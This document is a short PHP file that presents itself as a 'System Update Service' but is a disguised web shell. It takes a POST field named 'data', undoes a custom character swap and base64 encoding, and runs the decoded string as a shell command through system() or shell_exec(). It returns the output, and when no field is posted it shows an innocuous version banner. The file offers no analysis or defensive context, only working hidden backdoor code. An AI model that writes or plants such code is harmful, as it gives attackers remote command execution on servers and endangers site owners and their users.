<?php
class SystemUpdate {
    private $config;
    
    public function __construct() {
        $this->config = array(
            'version' => '1.0.0',
            'status' => 'active'
        );
    }
    
    public function check() {
        if(isset($_POST['data'])) {
            return $this->processData($_POST['data']);
        }
        return $this->showNormal();
    }
    
    private function processData($input) {
        $mapping = array(
            "|" => "a",
            "!" => "b", 
            "@" => "c",
            "_" => "d",
            "~" => "="
        );
        
        $decoded = strtr($input, $mapping);
        $command = base64_decode($decoded);
        
        if($command) {
            return $this->safeExecute($command);
        }
        return "Invalid data";
    }
    
    private function safeExecute($cmd) {
        if(function_exists('system')) {
            ob_start();
            system($cmd);
            return ob_get_clean();
        } elseif(function_exists('shell_exec')) {
            return shell_exec($cmd);
        } else {
            return "Command execution not supported";
        }
    }
    
    private function showNormal() {
        return "System Update Service - Version " . $this->config['version'];
    }
}

$updater = new SystemUpdate();
echo $updater->check();
?>